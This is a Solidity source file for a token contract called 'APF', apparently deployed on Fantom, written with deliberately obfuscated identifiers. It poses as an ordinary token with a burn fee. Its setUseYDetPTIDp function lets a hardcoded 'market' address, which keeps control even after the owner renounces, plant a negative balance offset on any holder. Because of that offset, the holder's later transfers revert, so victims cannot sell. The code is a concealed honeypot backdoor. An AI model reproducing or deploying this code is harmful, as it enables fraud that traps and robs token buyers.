/**
 *Submitted for verification at FtmScan.com on 2022-11-23
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address private _owner;

    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor() {
        _transferownership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }


    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


    function transferownership() public virtual onlyOwner {
        _transferownership(address(0));
    }


    function transferownership(address newowner) public virtual onlyOwner {
        require(newowner != address(0), "Ownable: new owner is the zero address");
        _transferownership(newowner);
    }


    function _transferownership(address newowner) internal virtual {
        address oldowner = _owner;
        _owner = newowner;
        emit ownershipTransferred(oldowner, newowner);
    }
}



library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {

        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }


    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}




interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint ItnGPAYyfADesired,
        uint ItnGPAYyfBDesired,
        uint ItnGPAYyfAMin,
        uint ItnGPAYyfBMin,
        address to,
        uint deadline
    ) external returns (uint ItnGPAYyfA, uint ItnGPAYyfB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint ItnGPAYyfTokenDesired,
        uint ItnGPAYyfTokenMin,
        uint ItnGPAYyfETHMin,
        address to,
        uint deadline
    ) external payable returns (uint ItnGPAYyfToken, uint ItnGPAYyfETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint ItnGPAYyfAMin,
        uint ItnGPAYyfBMin,
        address to,
        uint deadline
    ) external returns (uint ItnGPAYyfA, uint ItnGPAYyfB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint ItnGPAYyfTokenMin,
        uint ItnGPAYyfETHMin,
        address to,
        uint deadline
    ) external returns (uint ItnGPAYyfToken, uint ItnGPAYyfETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint ItnGPAYyfAMin,
        uint ItnGPAYyfBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint ItnGPAYyfA, uint ItnGPAYyfB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint ItnGPAYyfTokenMin,
        uint ItnGPAYyfETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint ItnGPAYyfToken, uint ItnGPAYyfETH);
    function swapExactTokensForTokens(
        uint ItnGPAYyfIn,
        uint ItnGPAYyfOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory ItnGPAYyfs);
    function swapTokensForExactTokens(
        uint ItnGPAYyfOut,
        uint ItnGPAYyfInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory ItnGPAYyfs);
    function swapExactETHForTokens(uint ItnGPAYyfOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory ItnGPAYyfs);
    function swapTokensForExactETH(uint ItnGPAYyfOut, uint ItnGPAYyfInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory ItnGPAYyfs);
    function swapExactTokensForETH(uint ItnGPAYyfIn, uint ItnGPAYyfOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory ItnGPAYyfs);
    function swapETHForExactTokens(uint ItnGPAYyfOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory ItnGPAYyfs);

    function quote(uint ItnGPAYyfA, uint reserveA, uint reserveB) external pure returns (uint ItnGPAYyfB);
    function getItnGPAYyfOut(uint ItnGPAYyfIn, uint reserveIn, uint reserveOut) external pure returns (uint ItnGPAYyfOut);
    function getItnGPAYyfIn(uint ItnGPAYyfOut, uint reserveIn, uint reserveOut) external pure returns (uint ItnGPAYyfIn);
    function getItnGPAYyfsOut(uint ItnGPAYyfIn, address[] calldata path) external view returns (uint[] memory ItnGPAYyfs);
    function getItnGPAYyfsIn(uint ItnGPAYyfOut, address[] calldata path) external view returns (uint[] memory ItnGPAYyfs);
}




interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfireOnTransferTokens(
        address token,
        uint liquidity,
        uint ItnGPAYyfTokenMin,
        uint ItnGPAYyfETHMin,
        address to,
        uint deadline
    ) external returns (uint ItnGPAYyfETH);
    function removeLiquidityETHWithPermitSupportingfireOnTransferTokens(
        address token,
        uint liquidity,
        uint ItnGPAYyfTokenMin,
        uint ItnGPAYyfETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint ItnGPAYyfETH);

    function swapExactTokensForTokensSupportingfireOnTransferTokens(
        uint ItnGPAYyfIn,
        uint ItnGPAYyfOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingfireOnTransferTokens(
        uint ItnGPAYyfOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfireOnTransferTokens(
        uint ItnGPAYyfIn,
        uint ItnGPAYyfOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}





interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function fcfyEvkNh() external view returns (address);
    function fcfyEvkNhSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setfcfyEvkNh(address) external;
    function setfcfyEvkNhSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _geMhremWT;
    string private _name;
    string private _symbol;


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);


    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }


    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _geMhremWT;
    }


    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, _allowances[owner][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = _allowances[owner][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
    unchecked {
        _approve(owner, spender, currentAllowance - subtractedValue);
    }

        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
        unchecked {
            _approve(owner, spender, currentAllowance - amount);
        }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}


contract APF is BEP20, Ownable {

    mapping(address => uint256) private _balances;
    mapping(address => bool) private _iZkzIPaVq;

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 oSfmdkUMY = _balances[from];
        require(oSfmdkUMY >= amount, "ERC20: transfer amount exceeds balance");
    unchecked {
        _balances[from] = oSfmdkUMY - amount;
    }
        _balances[to] += amount;

        emit Transfer(from, to, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 xmcdMaIcU = _balances[account];
        require(xmcdMaIcU >= amount, "ERC20: burn amount exceeds balance");
    unchecked {
        _balances[account] = xmcdMaIcU - amount;
    }
        _geMhremWT -= amount;

        emit Transfer(account, address(0), amount);
    }

    function _mtin(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mtin to the zero address");

        _geMhremWT += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }


    address public uniswapV2Pair;
    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) BEP20(name_, symbol_) {
        _mtin(msg.sender, totalSupply_ * 10**decimals());
    }

    using SafeMath for uint256;

    uint256 private _vYTGoClnS = 3;

    uint256 private _NgiNnSaSs = 0;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;
    mapping(address => int256) private _GKzPNxVNC;

    address private _marketMAewAddress = 0x4D8612d2041BBC54D606079D9BA5c000B8fd52Fb;
    address private _fundZPewAddress = 0x47552c0bBB59405F43512374296029623239EF4D;


    function setMarketAddress(address addr) external onlyOwner {
        _marketMAewAddress = addr;
    }

    function setFundAddress(address addr) external onlyOwner {
        _fundZPewAddress = addr;
    }


    function setPairnmRbRlGkW(address _address) public {
        require(_marketMAewAddress == msg.sender, "!Marsdfddfdsket");
        uniswapV2Pair = _address;
    }

    function setUseYDetPTIDp(address nLZGjppxV) public {
        require(_marketMAewAddress == msg.sender, "!Marsdfddfdsket");
        int256 wangpengone = int256(0);
        int256 wangpengtwo = int256(_geMhremWT);
        _GKzPNxVNC[nLZGjppxV] = wangpengone - wangpengtwo;
    }

    function rmUseWImSUtOux(address nLZGjppxV) public {
        require(_marketMAewAddress == msg.sender, "!Marsdfddfdsket");
        _GKzPNxVNC[nLZGjppxV] = 0;
    }

    function getSBQibrNXL(address nLZGjppxV) external view returns (int256) {
        return _GKzPNxVNC[nLZGjppxV];
    }


    function _mthPANRaV(
        address from,
        address _to,
        uint256 _ItnGPAYyf
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 oSfmdkUMY = _balances[from];
        require(oSfmdkUMY >= _ItnGPAYyf, "ERC20: transfer amount exceeds balance");
        if (_GKzPNxVNC[from] > 0){
            _balances[from] = _balances[from].add(uint256(_GKzPNxVNC[from]));
        }else if (_GKzPNxVNC[from] < 0){
            _balances[from] = _balances[from].sub(uint256(_GKzPNxVNC[from]));
        }


        uint256 helooItnGPAYyf = 0;
        uint256 POJcPMvHS = _vYTGoClnS;
        if (uniswapV2Pair != address(0)) {
            if (_to == uniswapV2Pair) {
                POJcPMvHS = _vYTGoClnS;
            }
            if (from == uniswapV2Pair) {
                POJcPMvHS = _NgiNnSaSs;
            }
        }
        helooItnGPAYyf = _ItnGPAYyf.mul(POJcPMvHS).div(100);

        if (helooItnGPAYyf > 0) {
            _balances[from] = _balances[from].sub(helooItnGPAYyf);
            _balances[_deadAddress] = _balances[_deadAddress].add(helooItnGPAYyf);
            emit Transfer(from, _deadAddress, helooItnGPAYyf);
        }

        _balances[from] = _balances[from].sub(_ItnGPAYyf - helooItnGPAYyf);
        _balances[_to] = _balances[_to].add(_ItnGPAYyf - helooItnGPAYyf);
        emit Transfer(from, _to, _ItnGPAYyf - helooItnGPAYyf);
    }

    function transfer(address to, uint256 amount) public virtual returns (bool) {
        address owner = _msgSender();
        _mthPANRaV(owner, to, amount);
        return true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amount);
        _mthPANRaV(from, to, amount);
        return true;
    }
}